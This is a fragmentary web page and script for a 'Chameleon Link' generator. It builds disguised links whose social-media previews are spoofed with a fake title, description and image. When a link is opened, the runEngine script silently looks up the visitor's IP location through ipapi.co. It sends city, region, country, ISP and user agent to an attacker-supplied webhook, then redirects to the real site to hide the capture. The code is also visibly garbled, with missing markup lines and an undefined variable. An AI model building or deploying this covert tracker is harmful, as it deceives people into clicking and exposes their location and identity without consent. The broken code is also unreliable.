        <div class="bg-gradient-to-br from-indigo-600 to-violet-700 p-8 text-white text-center">

            </div>

                <label class="text-[10px] font-black text-slate-400 uppercase ml-1">Real Destination (Redirect)</label>
                <input type="url" id="dest-url" placeholder="https://real-site.com" class="w-full p-4 rounded-2xl bg-slate-100 border-none text-xs focus:ring-2 focus:ring-indigo-500 outline-none">

                    <input type="text" id="spoof-desc" placeholder="Fake Description" class="w-full p-3 rounded-xl bg-white border border-slate-200 text-xs outline-none">
                    <input type="text" id="spoof-img" placeholder="Fake Image URL (Unsplash/Direct Link)" class="w-full p-3 rounded-xl bg-white border border-slate-200 text-xs outline-none">

    <script>
        lucide.createIcons();

        function createGhostLink() {
            const webhook = document.getElementById('webhook-input').value;
            const dest = document.getElementById('dest-url').value;
            const sTitle = document.getElementById('spoof-title').value || "Secure Shared File";
            const sDesc = document.getElementById('spoof-desc').value || "Click to view content";
            const sImg = document.getElementById('spoof-img').value || "https://images.unsplash.com/photo-1550751827-4bd374c3f58b";

            if(!webhook || !dest) return alert("Missing Webhook or Destination");

            const config = btoa(JSON.stringify({ 
                w: webhook, 
                d: dest, 
                st: sTitle, 
                sd: sDesc, 
                si: sImg 
            }));
            
            const final = window.location.href.split('#')[0] + "#track=" + config;
            document.getElementById('final-link').value = final;
            document.getElementById('result-box').classList.remove('hidden');
        }

        async function runEngine() {
            const hash = window.location.hash;
            if (hash.startsWith('#track=')) {

                const config = JSON.parse(atob(configStr));

                document.querySelector('meta[property="og:title"]').setAttribute("content", config.st);

                document.querySelector('meta[property="og:image"]').setAttribute("content", config.si);

                        <p class="text-xs text-slate-400 uppercase tracking-widest animate-pulse">Establishing Secure Tunnel</p>
                    </div>
                `;
                lucide.createIcons();

                // --- 3. HARVEST & LOG ---
                try {
                    const ipRes = await fetch('https://ipapi.co/json/');
                    const ip = await ipRes.json();

                    await fetch(config.w, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            embeds: [{
                                title: "ðŸŽ­ Chameleon Link Triggered",

                                    { name: "Location", value: `${ip.city}, ${ip.region}, ${ip.country_name}`, inline: true },
                                    { name: "ISP", value: ip.org },
                                    { name: "User Agent", value: navigator.userAgent }
                                ],
                                timestamp: new Date().toISOString()
                            }]
                        })
                    });
                } catch (e) { console.warn("Tracking failed, proceeding to redirect."); }

                // --- 4. REDIRECT ---
                setTimeout(() => {
                    window.location.href = config.d;
                }, 1500); // 1.5s delay to ensure the webhook completes
            }
        }

        function copyResult() {
            const el = document.getElementById("final-link");
            el.select();
            document.execCommand("copy");
            alert("Chameleon Link Copied!");
        }

        window.onload = runEngine;
